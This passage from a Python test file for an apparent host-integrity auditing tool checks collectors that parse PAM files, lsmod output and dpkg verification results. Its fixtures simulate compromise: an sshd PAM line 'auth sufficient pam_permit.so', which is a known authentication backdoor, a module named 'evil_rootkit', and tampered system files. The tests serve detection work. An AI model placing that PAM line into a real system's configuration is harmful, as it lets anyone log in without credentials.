    sshd_entry = next(f for f in result["pam_files"] if f["path"] == "/etc/pam.d/sshd")
    assert "pam_permit.so" in sshd_entry["content"]
    assert result["nsswitch_content"] == "passwd: files systemd\n"


def test_pam_collector_preserves_partial_results_when_a_later_file_read_raises():
    from ubuntils.collectors.pam import PamCollector

    class _FlakySource:
        def glob(self, pattern):
            return ["/etc/pam.d/sshd", "/etc/pam.d/common-auth"]

        def read_text(self, path):
            if path == "/etc/pam.d/sshd":
                return "auth sufficient pam_permit.so\n"
            if path == "/etc/pam.d/common-auth":
                # A non-OSError/ValueError failure on the SECOND file must not
                # discard the first file's already-read content.
                raise RuntimeError("unexpected failure reading " + path)
            return ""  # /etc/nsswitch.conf — unrelated to this test

    result = PamCollector(source=_FlakySource()).collect()

    paths = {f["path"] for f in result["pam_files"]}
    assert paths == {"/etc/pam.d/sshd"}


# ─── KernelCollector ─────────────────────────────────────────────────────────

def test_kernel_collector_parses_lsmod(tmp_path):
    from ubuntils.collectors.kernel import KernelCollector
    from ubuntils.collectors.source import BundleSource

    cmds = tmp_path / "commands"
    cmds.mkdir()
    (cmds / "lsmod.txt").write_text(
        "Module                  Size  Used by\n"
        "xt_conntrack           16384  1 iptable_filter\n"
        "evil_rootkit           12288  0\n"
    )
    src = BundleSource(root_dir=str(tmp_path / "files"),
                        command_index={"lsmod": str(cmds / "lsmod.txt")})

    result = KernelCollector(source=src).collect()
    names = [m["name"] for m in result["kernel_modules"]]

    assert names == ["xt_conntrack", "evil_rootkit"]
    xt = next(m for m in result["kernel_modules"] if m["name"] == "xt_conntrack")
    assert xt["used_by"] == ["iptable_filter"]


_DPKG_VERIFY_WAZUH = (
    "??5??????   /var/wazuh-manager/etc/client.keys\n"
    "missing     /etc/init.d/wazuh-manager\n"
    "??5??????   /usr/lib/aarch64-linux-gnu/libc.so.6\n"
    "missing     /usr/lib/python3/dist-packages/twisted/plugins\n"
    "??5?????? c /etc/ssh/sshd_config\n"
    "??5??????   /opt/unowned/thing\n"
)
_DPKG_OWNERS = (
    "wazuh-manager: /var/wazuh-manager/etc/client.keys\n"
    "wazuh-manager: /etc/init.d/wazuh-manager\n"
    "libc6:arm64: /usr/lib/aarch64-linux-gnu/libc.so.6\n"
    "python3-twisted, python3-automat: /usr/lib/python3/dist-packages/twisted/plugins\n"
    "diversion by dash from: /bin/sh\n"
    "openssh-server: /etc/ssh/sshd_config\n"
    "coreutils: /usr/bin/ls\n"
)


def test_package_collector_attributes_dpkg_entries_to_owning_package():
    from ubuntils.collectors.packages import PackageCollector, DPKG_OWNERS_ARGV, DPKG_OWNERS_TIMEOUT

    src = _SpySource(responses={
        "dpkg_verify": (_DPKG_VERIFY_WAZUH, "", 1),
        "dpkg_owners": (_DPKG_OWNERS, "", 0),
    })
    collector = PackageCollector(source=src)
    entries = {e["path"]: e for e in collector.collect()["dpkg_verify_entries"]}

    assert entries["/var/wazuh-manager/etc/client.keys"]["package"] == "wazuh-manager"
    assert entries["/etc/init.d/wazuh-manager"]["package"] == "wazuh-manager"
    assert entries["/usr/lib/aarch64-linux-gnu/libc.so.6"]["package"] == "libc6:arm64"
    # Shared paths list several owners; the first is attributed.
    assert entries["/usr/lib/python3/dist-packages/twisted/plugins"]["package"] == "python3-twisted"
    assert entries["/opt/unowned/thing"]["package"] is None
    assert collector.degraded == []

    call = next(c for c in src.calls if c["name"] == "dpkg_owners")
    assert call["argv"] == DPKG_OWNERS_ARGV and call["timeout"] == DPKG_OWNERS_TIMEOUT


def test_package_collector_skips_ownership_lookup_when_verify_is_clean():
    from ubuntils.collectors.packages import PackageCollector

    src = _SpySource(responses={"dpkg_verify": ("", "", 0)})
    PackageCollector(source=src).collect()
    assert "dpkg_owners" not in {c["name"] for c in src.calls}


def test_package_collector_marks_degraded_when_ownership_unavailable():
    # Bundles collected before dpkg_owners existed replay it as rc -1.
    from ubuntils.collectors.packages import PackageCollector

    src = _SpySource(responses={
        "dpkg_verify": (_DPKG_VERIFY_WAZUH, "", 1),
        "dpkg_owners": ("", "command 'dpkg_owners' not captured in bundle", -1),
    })
    collector = PackageCollector(source=src)
    entries = collector.collect()["dpkg_verify_entries"]
    assert all(e["package"] is None for e in entries)
    assert any("dpkg-query" in reason for reason in collector.degraded)


def test_bundle_captures_dpkg_owners_with_live_argv_and_timeout():
    from ubuntils.bundle.writer import COMMAND_TIMEOUTS
    from ubuntils.cli import COLLECT_COMMANDS
    from ubuntils.collectors.packages import DPKG_OWNERS_ARGV, DPKG_OWNERS_TIMEOUT

    assert ("dpkg_owners", DPKG_OWNERS_ARGV) in COLLECT_COMMANDS
    assert COMMAND_TIMEOUTS["dpkg_owners"] == DPKG_OWNERS_TIMEOUT


def test_package_collector_marks_missing_directories_from_md5sums(tmp_path):
    # dpkg's .md5sums lists only regular files, so a missing path that isn't
    # in it is a directory (or symlink) — an empty dir going away is not tampering.
    from ubuntils.collectors.packages import PackageCollector

    info = tmp_path / "var" / "lib" / "dpkg" / "info"
    info.mkdir(parents=True)
    (info / "apparmor.md5sums").write_text("d41d8cd98f00b204e9800998ecf8427e  sbin/apparmor_parser\n")
    (info / "libc6:arm64.md5sums").write_text("d41d8cd98f00b204e9800998ecf8427e  usr/lib/aarch64-linux-gnu/libc.so.6\n")

    class _Src(_SpySource):
        def read_text(self, path):
            return (tmp_path / path.lstrip("/")).read_text()

    src = _Src(responses={
        "dpkg_verify": ("missing     /etc/apparmor.d/disable\n"
                        "missing     /usr/lib/aarch64-linux-gnu/libc.so.6\n"
                        "missing     /usr/bin/ghost\n", "", 1),
        "dpkg_owners": ("apparmor: /etc/apparmor.d/disable\n"
                        "libc6:arm64: /usr/lib/aarch64-linux-gnu/libc.so.6\n"
                        "nomd5: /usr/bin/ghost\n", "", 0),
    })
    entries = {e["path"]: e for e in PackageCollector(source=src).collect()["dpkg_verify_entries"]}
    assert entries["/etc/apparmor.d/disable"]["is_directory"] is True
    assert entries["/usr/lib/aarch64-linux-gnu/libc.so.6"]["is_directory"] is False
    # No .md5sums to consult (bundle, unusual package): unknown, treated as a file.
    assert entries["/usr/bin/ghost"]["is_directory"] is None


def test_package_collector_keeps_conffile_marker_on_missing_entries(tmp_path):
    # Conffiles aren't in .md5sums either; without the marker a missing
    # /etc/init.d script would be misread as a missing directory.
    from ubuntils.collectors.packages import PackageCollector

    class _Src(_SpySource):
        def read_text(self, path):
            if path == "/var/lib/dpkg/info/wazuh-manager.md5sums":
                return "d41d8cd98f00b204e9800998ecf8427e  var/wazuh-manager/bin/x\n"
            raise OSError(path)

    src = _Src(responses={
        "dpkg_verify": ("missing   c /etc/init.d/wazuh-manager\n", "", 1),
        "dpkg_owners": ("wazuh-manager: /etc/init.d/wazuh-manager\n", "", 0),
    })
    entry = PackageCollector(source=src).collect()["dpkg_verify_entries"][0]
    assert entry["path"] == "/etc/init.d/wazuh-manager"
    assert entry["is_conffile"] is True and entry["missing"] is True
    assert entry["is_directory"] is False
